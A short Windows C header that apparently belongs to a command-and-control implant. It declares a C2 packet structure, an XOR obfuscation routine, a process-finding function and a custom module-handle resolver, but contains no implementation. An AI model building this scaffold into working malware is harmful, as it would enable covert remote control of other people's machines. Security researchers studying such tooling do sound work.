#pragma once

#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <wininet.h>
#include <winternl.h>
#include <tlhelp32.h>

typedef struct _C2_PACKET {
    DWORD CmdId;
    BYTE  Data[1024];
} C2_PACKET, *PC2_PACKET;

void XOR(PUCHAR data, size_t data_sz, PUCHAR key, size_t key_sz);
int get_process(LPCSTR lpName, PHANDLE hProc, PDWORD PID);
HMODULE CustomGetModuleHandleW(LPCWSTR moduleName);